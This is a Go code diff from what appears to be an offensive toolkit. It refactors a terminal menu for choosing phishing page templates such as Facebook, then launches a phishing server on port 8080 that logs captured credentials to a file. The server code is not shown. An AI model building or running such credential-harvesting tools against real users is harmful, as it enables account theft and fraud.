@@ -1,13 +1,14 @@
-package phish
+package web
 
 import (
 	"fmt"
-	"knife/tui"
 	"os"
 
 	"github.com/charmbracelet/bubbles/list"
 	tea "github.com/charmbracelet/bubbletea"
 	"github.com/charmbracelet/lipgloss"
+
+	"knife/tui"
 )
 
 type templateItem struct {
@@ -19,16 +20,16 @@ func (i templateItem) Title() string       { return i.title }
 func (i templateItem) Description() string { return i.description }
 func (i templateItem) FilterValue() string { return i.title }
 
-type phishModel struct {
+type pagePhishModel struct {
 	list   list.Model
 	chosen string
 }
 
-func (m phishModel) Init() tea.Cmd {
+func (m pagePhishModel) Init() tea.Cmd {
 	return nil
 }
 
-func (m phishModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
+func (m pagePhishModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 	switch msg := msg.(type) {
 	case tea.KeyMsg:
 		switch msg.String() {
@@ -50,11 +51,12 @@ func (m phishModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 	return m, cmd
 }
 
-func (m phishModel) View() string {
+func (m pagePhishModel) View() string {
 	return lipgloss.NewStyle().Margin(1, 2).Render(m.list.View())
 }
 
-func RunPhishModule() {
+// RunPhishModule displays the phishing template selection
+func RunPagePhishModule() {
 	items := []list.Item{
 		templateItem{
 			title:       "Facebook",
@@ -88,12 +90,20 @@ func RunPhishModule() {
 	l.SetShowStatusBar(false)
 	l.SetFilteringEnabled(false)
 
-	m := phishModel{list: l}
+	m := pagePhishModel{list: l}
 
 	p := tea.NewProgram(m, tea.WithAltScreen())
 	finalModel, err := p.Run()
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
 		return
+	}
+
+	if m, ok := finalModel.(pagePhishModel); ok && m.chosen != "" {
+		fmt.Println()
+		fmt.Println(tui.RenderInfo(fmt.Sprintf("Starting %s phishing server on port 8080...", m.chosen)))
+		fmt.Println(tui.RenderWarning("Credentials will be logged to phishing_creds.txt"))
+		fmt.Println()
+		Launch(m.chosen, 8080)
 	}
 }
